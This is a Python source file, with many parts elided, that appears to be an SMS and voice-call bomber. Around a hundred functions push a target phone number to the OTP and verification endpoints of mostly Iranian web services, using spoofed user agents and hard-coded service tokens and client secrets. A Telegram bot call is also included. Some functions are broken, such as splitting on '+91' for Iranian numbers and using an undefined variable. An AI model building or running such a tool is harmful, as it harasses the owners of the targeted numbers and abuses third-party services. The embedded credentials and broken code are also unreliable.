...
'''
def infoo():
   requests.get('https://api.telegram.org/bot'+str(token)+'/sendMessage?chat_id='+str(Id)+'&text='+str(ttl))
class sms:
    def behtarino(phone):
        n4 = {"phone": "0"+phone.split('+91')[1]}
    ...
    def tex3(phone):
        n4 = {"receptorPhone":"0"+phone.split('+91')[1]}
    ...
    def deniizshop(phone):
        n4 = {"mobile_phone": "0"+phone.split('+91')[1]}
        try: 
    ...
    def abantether(phone):
        n4 = {"phoneNumber": "0"+phone.split('+91')[1],"email": ""}
    ...
    def flightio(phone):
        n4 = {"userKey":"98-"+phone.split('+91')[1],"userKeyType": 1}
    ...
    def wide(phone):
        n4 = {"grant_type":"otp","client_id":"62b30c4af53e3b0cf100a4a0","phone":"0" + phone.split("+91")[1]}
    ...
    def tap30(phone):
        ...
        tap30D = {"credential": {"phoneNumber": "0" + phone.split("+91")[1], "role": "PASSENGER"}}
        try:
    ...
    def emtiaz(phone):
        ...
        emD = "send=1&cellphone=0"+phone.split("+91")[1]
        try:
    ...
    def bama(phone):
        ...
        bamaD = "cellNumber=0"+phone.split("+91")[1]
        try:
    ...
    def digify(phone):
        n4 = {"operationName":"Mutation","variables":{"content":{"phone_number":"0"+phone.split('+91')[1]}},"query":"mutation Mutation($content: MerchantRegisterOTPSendContent) {\n  merchantRegister {\n    otpSend(content: $content)\n    __typename\n  }\n}"}
    ...
    def snapfood(phone):
        ...
        sfoodD = {"cellphone": "0"+phone.split("+91")[1]}
        try:
    ...
    def alibaba(phone):
        ...
        alibabaD = {"phoneNumber": "0"+phone.split("+91")[1]}
        try:
    ...
    def smarket(phone):
        smarketU = f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{phone.split("+91")[1]}'
    ...
    def mrbilit(phone):
        ...
        try: 
            get(url=f"https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail=0{phone.split('+91')[1]}&source=2&sendTokenIfNot=true", headers=rhead)
            return True
        except:
            pass
    ...
    def arka(phone):
        ...
        arkaD = {"mobile": "0" + phone.split("+91")[1], "country_code": "IR", "provider_code": "RUBIKA"}
        try:
    ...
    def sTrip(phone):
        ...
        sTripD = {"lang": "fa", "country_id": "860", "password": "snaptrippass", "mobile_phone": "0" + phone.split("+91")[1], "country_code": "+91", "email": "example@gmail.com"}
        try:
    ...
    def bahram_shop(phone):
        ...
        bahram_request = {"username": "0"+phone.split("+91")[1]}
    ...
    def okcs(phone):
        rhead = {"user-agent": generate_user_agent()}
        try:
            get(url="https://okcs.com/users/mobilelogin?mobile=0" + phone.split("+91")[1], headers=rhead)
            return True
        except:
            pass
    ...
    def bitpin(phone):
        n4 = {"phone": "0"+phone.split('+91')[1],"captcha_token": ""}
    ...
    def binjo(phone):
        rhead = {"user-agent": generate_user_agent()}
        try:
            get(url="https://api.binjo.ir/api/panel/get_code/0" + phone.split("+91")[1], headers=rhead)
            return True
        except:
            pass

    def chamedoon(phone):
        chJ = {"mobile": '0'+phone.split('+91')[1],"origin": "/","referrer_id": None}
    ...
    def pinket(phone):
        rhead = {"user-agent": generate_user_agent()}
        pinket_request = {"phoneNumber": "0"+phone.split("+91")[1]}
    ...
    def otaghak(phone):
        rhead = {"user-agent": generate_user_agent()}
        otaghak_request = {"userName": "0"+phone.split("+91")[1]}
    ...
    def shab(phone):
        rhead = {"user-agent": generate_user_agent()}
        shab_request = {"mobile": "0"+phone.split("+91")[1], "country_code": "+91"}
    ...
    def raybit(phone):
        n4 = {"mobile":"+91"+phone.split('+91')[1],"side":"web"}
    ...
    def pubisha(phone):
        rhead = {"user-agent": generate_user_agent()}
        pubisha_request = "mobile=0"+phone.split("+91")[1]
    ...
    def digipay(phone):
        rhead = {"user-agent": generate_user_agent()}
        try:
            post("https://app.mydigipay.com/digipay/api/users/send-sms", json={"cellNumber": "0"+phone.split("+91")[1], "device": {"deviceId": "a16e6255-17c3-431b-b047-3f66d24c286f", "deviceModel": "WEB_BROWSER", "deviceAPI": "WEB_BROWSER", "osName": "WEB"}},headers=rhead, timeout=5)
            return True
        except:
            pass
    ...
    def taghche(phone):
        rhead = {"user-agent": generate_user_agent()}
        try:
            post("https://gw.taaghche.com/v4/site/auth/signup",json={"contact": "0"+phone.split("+91")[1]},headers=rhead, timeout=5)
            return True
        except:
            pass
    ...
    def sheypoor(phone):
        ...
        sheyporD = {"username": "0"+phone.split("+91")[1]}
        try:
    ...
    def doctor(phone):
        rhead = {"user-agent": generate_user_agent()}
        try:
            get(f'https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/{phone.split("+91")[1]}/sms?cCode=+91', headers=rhead, timeout=5)
            return True
        except:
            pass
    ...
    def achar(phone):
        rhead = {"user-agent": generate_user_agent()}
        try:
            post('https://api.achareh.ir/v2/accounts/login/',data={"phone": "0"+phone.split("+91")[1], "utm_source": "null"}, headers=rhead ,timeout=5)
            return True
        except:
            pass
    ...
    def snapp(num):
        rhead = {"user-agent": generate_user_agent()}
        try:
            post('https://api.snapp.ir/api/v1/sms/link',json={"phone": "0"+phone.split("+91")[1]},headers=rhead ,timeout=5)
            return True
        except:
            pass
    ...
    def tap30(phone):
        rhead = {"user-agent": generate_user_agent()}
        try:
            post('https://api.tapsi.cab/api/v2/user', json={"credential": {"phoneNumber": "0"+phone.split("+91")[1], "role": "PASSENGER"}}, headers=rhead, timeout=5)
            return True
        except:
            pass
    ...
    def tmg(phone):
        rhead = {"user-agent": generate_user_agent()}
        try:
            post('https://tagmond.com/phone_number', data='utf8=%E2%9C%93&phone_number=' +"0"+phone.split("+91")[1]+'&g-recaptcha-response=', headers=rhead)
            return True
        except:
            pass
    ...
    def a4baz(phone):
        rhead = {"user-agent": generate_user_agent()}
        try:
            post('https://a4baz.com/api/web/login',json={"cellphone": "0"+phone.split("+91")[1]}, headers=rhead)
            return True
        except:
            pass
    ...
    def doctoreto(phone):
        try:
            ...
            json={"mobile": "0"+phone.split("+91")[1], "country_id": 205}, 
    ...
    def gapfilm(phone):
        gaJ = {"Type": 3,"Username": phone.split("+91")[1],"SourceChannel": "GF_WebSite","SourcePlatform": "desktop","SourcePlatformAgentType": "Opera","SourcePlatformVersion": "82.0.4227.33","GiftCode": None}
    ...
    def lendo(phone):
        leD = {'_token': 'mXBVe062llzpXAxD5EzN4b5yqrSuWJMVPl1dFTV6','mobile': '0'+phone.split('+91')[1],'password': 'ibvvb@3#9nc'}
    ...
    def olgoo(phone):
        olD = {'contactInfo[mobile]': '0'+phone.split('+91')[1],'contactInfo[agreementAccepted]': '1','contactInfo[teachingFieldId]': '1','contactInfo[eduGradeIds][7]': '7','submit_register': '1'}
    ...
    def pakhsh(phone):
        paD = f'action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone.split("+91")[1]}&csrf=fdaa7fc8e6&login=2&username=&email=&captcha=&captcha_ses=&json=1&whatsapp=0'
    ...
    def didnegar(phone):
        paD = f'action=digits_check_mob&countrycode=%2B98&mobileNo={phone.split("+91")[1]}&csrf=4c9ac22ff4&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail=0{phone.split("+91")[1]}&dig_otp=&digits_login_remember_me=1&dig_nounce=4c9ac22ff4'
    ...
    def basalam(phone):
        baJ = {"variables": {"mobile": '0'+phone.split('+91')[1]},"query": "mutation verificationCodeRequest($mobile: MobileScalar!) { mobileVerificationCodeRequest(mobile: $mobile) { success } }"}
    ...
    def see5(phone):
        seD = {'mobile': '0'+phone.split('+91')[1],'action': 'sendsms'}
    ...
    def ghabzino(phone):
        ghJ = {"Parameters": {"ApplicationType": "Web","ApplicationUniqueToken": None,"ApplicationVersion": "1.0.0","MobileNumber": '0'+phone.split('+91')[1]}}
    ...
    def simkhanF(phone):
        ghJ = {"mobileNumber": '0'+phone.split('+91')[1],"ReSendSMS": False}
    ...
    def simkhanT(phone):
        ghJ = {"mobileNumber": '0'+phone.split('+91')[1],"ReSendSMS": True}
        ghU = 'https://www.simkhanapi.ir/api/users/registerV2'
        ghH = {'Accept': 'application/json','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Authorization': 'Bearer undefined','Connection': 'keep-alive','Content-Type': 'application/json','Host': 'www.simkhanapi.ir','Origin': 'https://simkhan.ir','Referer': 'https://simkhan.ir/','User-Agent': generate_user_agent(os="linux")}
        try:
            post(url=ghU, headers=ghH, json=ghJ)
    ...
    def limome(phone):
        liD = {'mobileNumber': phone.split('+91')[1],'country': '1'}
    ...
    def bimito(phone):
        liU = f"https://bimito.com/api/core/app/user/checkLoginAvailability/%7B%22phoneNumber%22%3A%220{phone.split('+91')[1]}%22%7D"
    ...
    def seebirani(phone):
        liJ = {"username": "0"+phone.split('+91')[1]}
    ...
    def mihanpezeshk(phone):
        gaD = f'_token=bBSxMx7ifcypKJuE8qQEhahIKpcVApWdfZXFkL8R&mobile={"0"+phone.split("+91")[1]}&recaptcha='
    ...
    def mek(phone):
        ...
        meD = {"landingPageUrl": "https://www.hamrah-mechanic.com/","orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/","phoneNumber": "0"+phone.split("+91")[1],"prevDomainUrl": None,"prevUrl": None,"referrer": "https://www.google.com/"}
        try:
    ...
    def hyperjan(phone):
        rhead = {"user-agent": generate_user_agent()}
        snapD = {"mobile": "0"+phone.split("+91")[1]}
        try:
    ...
    def digikala(phone):
        rhead = {"user-agent": generate_user_agent()}
        n4 = {"username": "0"+phone.split("+91")[1]}
        try:
    ...
    def hiword(phone):
        rhead = {"user-agent": generate_user_agent()}
        n4 = {"identifier": "0"+phone.split("+91")[1]}
        try:
    ...
    def abantether(phone):
        rhead = {"user-agent": generate_user_agent()}
        n4 = {"phoneNumber": "0"+phone.split("+91")[1]}
        try:
    ...
    def behzadshami(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo={phone.split('+91')[1]}&csrf=3b4194a8bb&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_%D9%81%DB%8C%D9%84%D8%AF%D9%85%D8%AA%D9%86%DB%8C1642498931181=Nvgu&digregcode=%2B98&digits_reg_mail={phone.split('+91')[1]}&dig_otp=&code=&dig_reg_mail=&dig_nounce=3b4194a8bb"
    ...
    def tikban(phone):
        rhead = {"user-agent": generate_user_agent()}
        n4 = {"CellPhone": "0"+phone.split("+91")[1]}
        try:
    ...
    def digistyle(phone):
        rhead = {"user-agent": generate_user_agent()}
        n4 = {"loginRegister[email_phone]": "0"+phone.split("+91")[1]}
        try:
    ...
    def exo(phone):
        n4 = {"mobile_number": "0"+phone.split("+91")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
    ...
    def takfarsh(phone):
        n4 = {"phone_email": "0"+phone.split("+91")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
    ...
    def beheshticarpet(phone):
        n4 = {"billing_mobile": "0"+phone.split("+91")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
    ...
    def mashinbank(phone):
        n4 = {"mobileNumber": "0"+phone.split("+91")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
    ...
    def cinematicket(phone):
        n4 = {"phone_number": "0"+phone.split("+91")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
    ...
    def opco(phone):
        n4 = {"telephone": "0"+phone.split("+91")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try:
    ...
    def deyfriedchicken(phone):
        js = {"apiToken":"VyG4uxayCdv5hNFKmaTeMJzw3F95sS9DVMXzMgvzgXrdyxHJGFcranHS2mECTWgq","clientSecret":"7eVdaVsYXUZ2qwA9yAu7QBSH2dFSCMwq","device":"web","username":"0" + phone.split("+91")[1]}
    ...
    def donergarden(phone):
        js = {"apiToken":"Ex0OHO6iS8ZfklgSKhaTmWAp34lYLNLFZvMXiuVfhc2ov2uq9kpwYUUrxTWNnhWE","clientSecret":"BuUDcLI9IMQNpWeaHYtVfKzoxwEZNza4","device":"web","username":"0" + phone.split("+91")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try: #donergarden.com
            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
            return True
    ...
    def foodbell(phone):
        js = {"apiToken":"WTKnmBBIpjL8kcOo7YGD0qkaa6p06bVER9IMUNsyVOj9J2AMlmjESWhqtuNqWBNN","clientSecret":"aINO67nX5aCs5e7382XQJZkYbROBBewt","device":"web","username":"0" + phone.split("+91")[1]}
    ...
    def foodiran16(phone):
        js = {"apiToken":"mUkchCAJ9Po58IqEzz507gKwv5mz2kzplUctHuTxXDrTAfjfHyPJqXKGJxrnaKSX","clientSecret":"HVB23K4Y9LPvOLuUCTo3QOHolaYGupgP","device":"web","username":"0" + phone.split("+91")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try: #foodiran16.com
            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
            return True
    ...
    def foodlandkish(phone):
        js = {"apiToken":"KbCO8YaHKctowfL1Rny8gB9A9B2kGZvHJBbN918Nsn1p2Ui0FbLWdJ1JdCQ6hzAu","clientSecret":"MvfPc5BT2lRrpmOCYZzAAGg7d7J8ZVnv","device":"web","username":"0" + phone.split("+91")[1]}
        rhead = {"user-agent": generate_user_agent()}
    ...
    def gelatohouse(phone):
        js = {"apiToken":"10tQStiKTniALgYpYQ4hm0UCuadXWbHdMklMIpyTE5DSzkNSfx1r2p02pqg3QKx3","clientSecret":"MZ0TNC0swsGFk6gbfCdvtZHRukZyFntu","device":"web","username":"0" + phone.split("+91")[1]}
        rhead = {"user-agent": generate_user_agent()}
    ...
    def givernfood(phone):
        js = {"apiToken":"iIWfAtW16GstuASFfuUO0iY9LKz3dKQpdsKZ2ANBK5YokN2J7pom4oq0tYTz5eXv","clientSecret":"mpZYwzraYAyzcpD594LpWbHwTgHIcdNO","device":"web","username":"0" + phone.split("+91")[1]}
    ...
    def mahiyekhoob(phone):
        js = {"apiToken":"yJHp0J8gMDyUlAvrWC2E7G0OITtM18WXdRZdGSC2gKkkC8QHDBDsf5irJ4gpZvqP","clientSecret":"uTsq8sG1YWuIWcvK24UFtPighOfrl2H6","device":"web","username":"0" + phone.split("+91")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try: #mahiyekhoob.com
            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
            return True
    ...
    def nesengrill(phone):
        js = {"apiToken":"GAbsdbjms1fx2ow35UnRCxxIbYPaNTfbq67clc9r09TtjqcxzrAbNFLTNSRFLJZZ","clientSecret":"gK6flStcuutxn82oGDqGqFqrvDTTQEZ2","device":"web","username":"0" + phone.split("+91")[1]}
    ...
    def pirankalaco(phone):
        ...
        try: 
            post(url="https://pirankalaco.ir/shop/SendPhone.php",data=f"phone=0{phone.split('+91')[1]}",headers=head)
            return True
        except:
            pass
    ...
    def pizzapanjereh(phone):
        js = {"apiToken":"lv3sgZvKKUgc3GpayVVBq8Sw3tguTk9IYbGIXhLGjnhDQtyTNwD2gzwncF1x4B1j","clientSecret":"Vvo4qB2gRUNwev5A2w5osgS19HhAmAUM","device":"web","username":"0" + phone.split("+91")[1]}
        rhead = {"user-agent": generate_user_agent()}
    ...
    def shandiz(phone):
        js = {"apiToken":"sNpW61dZELLTwNhUD2YDsVuwMvzUihTLIEYpCSJDjXfH7GMfmDr9j5eWc4KJAJ2h","clientSecret":"va41e57WSFf6qO8o6i9oiAe5PcLuG3lS","device":"web","username":"0" + phone.split("+91")[1]}
        rhead = {"user-agent": generate_user_agent()}
        try: #shandiz.co
            post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
            return True
    ...
    def tnovin(phone):
        ...
        try: 
            post(url="http://shop.tnovin.com/login",data=f"phone=0{phone.split('+91')[1]}",headers=head)
            return True
        except:
            pass

    def dastkhat(phone):
        n4 = {"mobile":phone.split('+91')[1],"countryCode":98,"device_os":2}
        rhead = {"user-agent": generate_user_agent()}
        try: 
    ...
    def hamlex(phone):
        n4 =  f"fullname=%D9%85%D9%85%D8%AF&phoneNumber=0{phone.split('+91')[1]}&register="
    ...
    def irwco(phone):
        n4 =  f"mobile=0{phone.split('+91')[1]}"
    ...
    def moshaveran724(phone):
        n4 =  f"againkey=0{phone.split('+91')[1]}&cache=false"
    ...
    def steelalborz(phone):
        n4 = f'action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone.split("+91")[1]}&csrf=2aae5b41f1&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail=0{phone.split("+91")[1]}&dig_otp=&code=&dig_reg_mail=&dig_nounce=2aae5b41f1'
    ...
    def arshiyan(phone):
        n4 = {"country_code":"98","phone_number":phone.split('+91')[1]}
        rhead = {"user-agent": generate_user_agent()}
        try: 
    ...
    def alopeyk(phone):
        n4 = {"type":"CUSTOMER","model":"Chrome 104.0.0.0","platform":"pwa","version":"10","manufacturer":"Windows","isVirtual":False,"serial":True,"app_version":"1.2.6","uuid":True,"phone":"0"+phone.split('+91')[1]}
        rhead = {"user-agent": generate_user_agent()}
        try: 
    ...
    def balad(phone):
        n4 = {"phone_number":"0"+phone.split('+91')[1],"os_type":"W"}
    ...
    def chaymarket(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone.split('+91')[1]}&csrf=c832b38a97&login=2&username=&email=&captcha=&captcha_ses=&json=1&whatsapp=0"
    ...
    def coffefastfoodluxury(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone.split('+91')[1]}&csrf=e23c15918c&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail=0{phone.split('+91')[1]}&dig_otp=&code=&dig_reg_mail=&dig_nounce=e23c15918c"
    ...
    def foodcenter(phone):
        ...
        n4 = f"mobile=0{phone.split('+91')[1]}&__RequestVerificationToken=lqpAP86cm6ubwUoSRlGeHdrLJ90KhrBSHzLZ7_rAQ5dAZT-q__KWOkJ3TRoPtz8Q13HaLVCmcfsB1itFNtrvVbX0xWE1"
    ...
    def homtick(phone):
        n4 = {"mobileOrEmail":"0"+phone.split('+91')[1],"deviceCode":"d520c7a8-421b-4563-b955-f5abc56b97ec","firstName":"","lastName":"","password":""}
        rhead = {'user-agent': generate_user_agent()}
        try: 
    ...
    def iranamlaak(phone):
        n4 = {"AgencyMobile":"0"+phone.split('+91')[1]}
        rhead = {'user-agent': generate_user_agent()}
        try: 
    ...
    def kardoon(phone):
        n4 = {"optype":15,"userid":0,"mobile":"0"+phone.split('+91')[1],"firstname":"","lastname":"","cityid":0,"email":"","birthdate":"","gender":False,"avatarid":0,"packagename":"","versioncode":-1,"tokenkey":"","username":"","password":"","connectionname":"MainConStr"}
        rhead = {'user-agent': generate_user_agent()}
        try: 
    ...
    def nesengrill(phone):
        n4 = {"apiToken":"GAbsdbjms1fx2ow35UnRCxxIbYPaNTfbq67clc9r09TtjqcxzrAbNFLTNSRFLJZZ","clientSecret":"gK6flStcuutxn82oGDqGqFqrvDTTQEZ2","device":"web","username":"0"+phone.split('+91')[1]}
        rhead = {'user-agent': generate_user_agent()}
        try: 
    ...
    def sizdah50(phone):
        n4 = {"apiToken":"BYE7T3P73xwG8KKjUemqnpmtfi3CFKHt00w92hlBpGODB4dta45Z6qtVwUbvAM1s","clientSecret":"DJXBtleZru9SVf9uVnoG63E2I6dxzvkB","device":"web","username":"0"+phone.split('+91')[1]}
        rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://restaurant.delino.com/user/register",json=n4, headers=rhead)
            return True
    ...
    def zerocafe(phone):
        n4 = {"apiToken":"DBpPbfB2X7ZTnSyrugfKWuLoDbjn5VXAPgqVengvZznDEWoJV0y6x4GS1AL06Y7B","clientSecret":"51NZdnUk0cJClzlQCpz0S9YwMM0Fx9t2","device":"web","username":"0"+phone.split('+91')[1]}
        rhead = {'user-agent': generate_user_agent()}
        try: 
            post(url="https://restaurant.delino.com/user/register",json=n4, headers=rhead)
            return True
    ...
    def podro(phone):
        n4 = {"username":phone.split('+91')[1],"otp_provider":"INTERNAL","profile":{"name":"","national_code":""},"companies":[{"name":"kljkjjhhjjhde66","slug":"kljkjjhhjjhde66"}]}
    ...
    def rayshomar(phone):
        n4 = f"MobileNumber=0{phone.split('+91')[1]}"
    ...
    def refahtea(phone):
        n4 = f"action=refah_send_code&mobile=0{phone.split('+91')[1]}&security=c68b01b32a"
    ...
    def amoomilad(phone):
        n4 = {"Token":"5c486f96df46520d1e4d4a998515b1de02392c9b903a7734ec2798ec55be6e5c","DeviceId":1,"PhoneNumber":"0"+phone.split('+91')[1],"Helper":77942}
        rhead = {'user-agent': generate_user_agent()}
        try: 
    ...
    def ashraafi(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo={phone.split('+91')[1]}&csrf=54dfdabe34&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail={phone.split('+91')[1]}&dig_otp=&dig_nounce=54dfdabe34"
    ...
    def bandarazad(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone.split('+91')[1]}&csrf=ec10ccb02a&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail=0{phone.split('+91')[1]}&digits_reg_password=fuckYOU&dig_otp=&code=&dig_reg_mail=&dig_nounce=ec10ccb02a"
    ...
    def bazidone(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo={phone.split('+91')[1]}&csrf=c0f5d0dcf2&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail=0{phone.split('+91')[1]}&dig_otp=&digits_login_remember_me=1&dig_nounce=c0f5d0dcf2"
    ...
    def bigtoys(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone.split('+91')[1]}&csrf=94cf3ad9a4&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_name=%D8%A8%DB%8C%D8%A8%D9%84%DB%8C%D9%84&digregcode=%2B98&digits_reg_mail=0{phone.split('+91')[1]}&digregscode2=%2B98&mobmail2=&digits_reg_password=&dig_otp=&code=&dig_reg_mail=&dig_nounce=94cf3ad9a4"
    ...
    def bitex24(phone):
        ...
        try:
            get(url=f"https://bitex24.com/api/v1/auth/sendSms?mobile=0{phone.split('+91')[1]}&dial_code=0", headers=HEADER)
        except:
            pass

            
    def candoosms(phone):
        n4 = f"action=send_sms&phone=0{phone.split('+91')[1]}"
    ...
    def farsgraphic(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo={phone.split('+91')[1]}&csrf=79a35b4aa3&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_name=%D9%86%DB%8C%D9%85%D9%86%D9%85%D9%85%D9%86%DB%8C%D8%B3&digits_reg_lastname=%D9%85%D9%86%D8%B3%DB%8C%D8%B2%D8%AA%D9%86&digregscode2=%2B98&mobmail2=&digregcode=%2B98&digits_reg_mail={phone.split('+91')[1]}&dig_otp=&code=&dig_reg_mail=&dig_nounce=79a35b4aa3"
    ...
    def glite(phone):
        n4 = f"action=logini_first&login=0{phone.split('+91')[1]}"
    ...
    def hemat(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone.split('+91')[1]}&csrf=d33076d828&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregscode2=%2B98&mobmail2=&digregcode=%2B98&digits_reg_mail=0{phone.split('+91')[1]}&digits_reg_password=mahyar125&dig_otp=&code=&dig_reg_mail=&dig_nounce=d33076d828"
    ...
    def kodakamoz(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone.split('+91')[1]}&csrf=18551366bc&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_lastname=%D9%84%D8%A8%D8%A8%DB%8C%DB%8C%D8%A8%D8%AB%D9%82%D8%AD&digits_reg_displayname=%D8%A8%D8%A8%D8%A8%DB%8C%D8%B1%D8%A8%D9%84%D9%84%DB%8C%D8%A8%D9%84&digregscode2=%2B98&mobmail2=&digregcode=%2B98&digits_reg_mail=0{phone.split('+91')[1]}&digits_reg_password=&digits_reg_avansbirthdate=2003-03-21&jalali_digits_reg_avansbirthdate1867119037=1382-01-01&dig_otp=&code=&dig_reg_mail=&dig_nounce=18551366bc"
    ...
    def mipersia(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone.split('+91')[1]}&csrf=2d39af0a72&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail=0{phone.split('+91')[1]}&digregscode2=%2B98&mobmail2=&dig_otp=&code=&dig_reg_mail=&dig_nounce=2d39af0a72"
    ...
    def raminashop(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone.split('+91')[1]}&csrf=d397aa3b0e&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_name=%D8%A7%D8%AA%D8%B1%D8%AA%DB%8C%D8%A8%D8%A8&digregcode=%2B98&digits_reg_mail=0{phone.split('+91')[1]}&dig_otp=&code=&dig_reg_mail=&dig_nounce=d397aa3b0e"
    ...
    def sabziman(phone):
        n4 = f"action=newphoneexist&phonenumber=0{phone.split('+91')[1]}"
    ...
    def tajtehran(phone):
        n4 = f"mobile=0{phone.split('+91')[1]}&password=mamad1234"
    ...
    def zivanpet(phone):
        n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone.split('+91')[1]}&csrf=0864ed5c9b&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail=0{phone.split('+91')[1]}&dig_otp=&code=&dig_reg_mail=&dig_nounce=0864ed5c9b"
    ...
    def okala(phone):
        n4 = {"mobile":"0"+ phone.split('+91')[1],"deviceTypeCode":0,"confirmTerms":True,"notRobot":False}
...
class call:
    def trip(phone):
        ...
        try: 
            post(url="https://gateway.trip.ir/api/registers", headers=rhead, json={"CellPhone":"0"+phone.split('+91')[1]})
            post(url="https://gateway.trip.ir/api/Totp", headers=rhead, json={"PhoneNumber": "0"+phone.split('+91')[1]})
            return True
        except:
            pass
    ...
    def novinbook_call(phone):
        n4 = f"phone=0{phone.split('+91')[1]}&call=yes"
        rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '26','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'language=fa; currency=RLS','origin': 'https://novinbook.com','referer': 'https://novinbook.com/index.php?route=account/phone','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'} 
        try:
            post(url="https://novinbook.com/index.php?route=account/phone",data=n4, headers=rhead)
            return True
    ...
    def azki_call(phone):
        ...
        try:
            get(url=f"https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber=0{phone.split('+91')[1]}", headers=HEADER)
        except:
            pass
